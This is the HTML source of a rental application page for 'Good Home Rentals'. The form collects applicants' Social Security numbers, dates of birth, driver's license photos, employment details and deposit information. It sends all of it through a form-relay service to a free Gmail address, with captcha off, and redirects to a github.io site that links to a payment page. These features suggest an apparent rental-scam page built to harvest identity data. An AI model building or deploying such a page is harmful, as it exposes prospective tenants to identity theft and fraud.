<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Rental Application Form - Good Home Rentals</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Poppins', sans-serif;
      min-height: 100vh;
      background: url('https://source.unsplash.com/random/1600x900/?house') no-repeat center/cover;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
    }

    header {
      position: sticky;
      top: 0;
      background: #1a3c34;
      padding: 15px;
      width: 100%;
      z-index: 1000;
    }

    nav ul {
      list-style: none;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    nav a {
      color: white;
      text-decoration: none;
      font-size: 1.1rem;
      font-weight: 400;
      transition: color 0.3s ease;
    }

    nav a:hover {
      color: #4CAF50;
    }

    .hero {
      text-align: center;
      padding: 40px 20px;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 15px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      max-width: 800px;
      width: 100%;
      margin: 20px 0;
    }

    h1 {
      color: #1a3c34;
      font-size: 2.5rem;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .form-container {
      background: white;
      border-radius: 10px;
      padding: 20px;
      margin: 15px 0;
      width: 100%;
      max-width: 600px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }

    h2 {
      color: #1a3c34;
      font-size: 1.5rem;
      font-weight: 400;
      margin-bottom: 15px;
    }

    label {
      display: block;
      color: #4a6360;
      font-size: 0.9rem;
      font-weight: 400;
      margin-bottom: 5px;
    }

    input, select, textarea {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 1rem;
      font-family: 'Poppins', sans-serif;
    }

    input[type="radio"] {
      width: auto;
      margin-right: 10px;
    }

    .radio-group {
      display: flex;
      gap: 20px;
      margin-bottom: 15px;
    }

    button {
      font-size: 1.1rem;
      font-weight: 400;
      padding: 12px 30px;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      background: linear-gradient(90deg, #4CAF50, #2e7d32);
      color: white;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: background 0.3s ease, transform 0.2s ease;
    }

    button:hover {
      background: linear-gradient(90deg, #45a049, #27632a);
      transform: scale(1.05);
    }

    button:active {
      transform: scale(0.95);
    }

    footer {
      margin-top: 40px;
      font-size: 0.9rem;
      color: #4a6360;
      padding: 15px;
      background: rgba(255, 255, 255, 0.8);
      border-radius: 10px;
      width: 100%;
      text-align: center;
    }

    @media (max-width: 600px) {
      h1 {
        font-size: 1.8rem;
      }

      .form-container {
        padding: 15px;
      }

      button {
        font-size: 1rem;
        padding: 10px 20px;
      }

      nav ul {
        flex-direction: column;
        gap: 10px;
      }
    }
  </style>
</head>
<body>
  <header>
    <nav>
      <ul>
        <li><a href="index.html">Home</a></li>
        <li><a href="application.html">Apply</a></li>
        <li><a href="payment-choice.html">Pay</a></li>
        <li><a href="contact.html">Contact</a></li>
      </ul>
    </nav>
  </header>

  <div class="hero">
    <h1>Rental Application Form</h1>
  </div>

  <form action="https://formsubmit.co/goodhome267@gmail.com" method="POST" enctype="multipart/form-data"> 
  
  <div class="form-container">
    <h2>Applicant’s Information</h2>

      <input type="hidden" name="_next" value="index.html">
      <input type="hidden" name="_subject" value="New Rental Application Submission">
      <label for="date">Today’s Date</label>
      <input type="date" id="date" name="date" required>

      <label for="address">Address Applied For</label>
      <input type="text" id="address" name="address" required>

      <label for="email">Email Address</label>
      <input type="email" id="email" name="email" required>

      <label for="ssn">SSN (Social Security Number)</label>
      <input type="text" id="ssn" name="ssn" pattern="\d{9}" placeholder="XXXXXXXXX" required>

      <label for="dob">Date of Birth</label>
      <input type="date" id="dob" name="dob" required>

      <label for="phone">Phone Number</label>
      <input type="tel" id="phone" name="phone" pattern="\d{10}" placeholder="XXXXXXXXXX" required>

      <label for="prev-address">Previous Address</label>
      <input type="text" id="prev-address" name="prev-address" required>

      <label for="landlord">Landlord or Mortgage Co.</label>
      <input type="text" id="landlord" name="landlord">

      <label for="landlord-phone">Phone (Landlord)</label>
      <input type="tel" id="landlord-phone" name="landlord-phone" pattern="\d{10}" placeholder="XXXXXXXXXX">

      <label for="rent-amount">Rent Amount</label>
      <input type="number" id="rent-amount" name="rent-amount" step="100.0">

      <label for="reason-leaving">Reason for Leaving</label>
      <textarea id="reason-leaving" name="reason-leaving"></textarea>

      <label for="marital-status">Single or Married</label>
      <select id="marital-status" name="marital-status" required>
        <option value="">Select</option>
        <option value="single">Single</option>
        <option value="married">Married</option>
      </select>

      <label for="occupants">Proposed Occupants & Ages</label>
      <textarea id="occupants" name="occupants"></textarea>

      <label for="pet">Pet</label>
      <input type="text" id="pet" name="pet">

      <label for="vehicle">Vehicle Type</label>
      <input type="text" id="vehicle" name="vehicle">

      <label>Smoker?</label>
      <div class="radio-group">
        <label><input type="radio" name="smoker" value="yes"> Yes</label>
        <label><input type="radio" name="smoker" value="no" checked> No</label>
      </div>

      <label for="deposit-date">Earliest Possible Date of Deposit Payment</label>
      <input type="date" id="deposit-date" name="deposit-date" required>

      <label for="deposit-amount">Amount Available to Secure Property</label>
      <input type="number" id="deposit-amount" name="deposit-amount" step="100.0" required>

      <label for="move-in-date">Proposed Move-in Date</label>
      <input type="date" id="move-in-date" name="move-in-date" required>

      <label for="employment-status">Employment Status</label>
      <select id="employment-status" name="employment-status" required>
        <option value="">Select</option>
        <option value="employed">Employed</option>
        <option value="self-employed">Self-Employed</option>
        <option value="unemployed">Unemployed</option>
      </select>

      <label for="employer">Employed By</label>
      <input type="text" id="employer" name="employer">

      <label for="employment-duration">How long have you worked there?</label>
      <input type="text" id="employment-duration" name="employment-duration">

      <label for="work-address">Work Address</label>
      <input type="text" id="work-address" name="work-address">

      <label for="work-phone">Work Phone#</label>
      <input type="tel" id="work-phone" name="work-phone" pattern="\d{10}" placeholder="XXXXXXXXXX">

      <label for="reference">Personal Reference</label>
      <input type="text" id="reference" name="reference">

      <label for="reference-phone">Reference Phone#</label>
      <input type="tel" id="reference-phone" name="reference-phone" pattern="\d{10}" placeholder="XXXXXXXXXX">

      <label for="license-front">Upload Driver's License (Front)</label>
      <input type="file" id="license-front" name="license-front" accept="image/*">

      <label for="license-back">Upload Driver's License (Back)</label>
      <input type="file" id="license-back" name="license-back" accept="image/*">

      <label for="signature">Signature</label>
      <input type="text" id="signature" name="signature" required>

      <label for="date-signed">Date Signed</label>
      <input type="date" id="date-signed" name="date-signed" required>

      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_next" value="https://goodhomesrentals.github.io/rentalapplication/index.html">

      <button type="submit"><i class="fas fa-paper-plane"></i> Submit Application</button>
    </form>
  </div>

  <footer>© 2025 Good Home Rentals. All rights reserved.</footer>
</body>
</html>
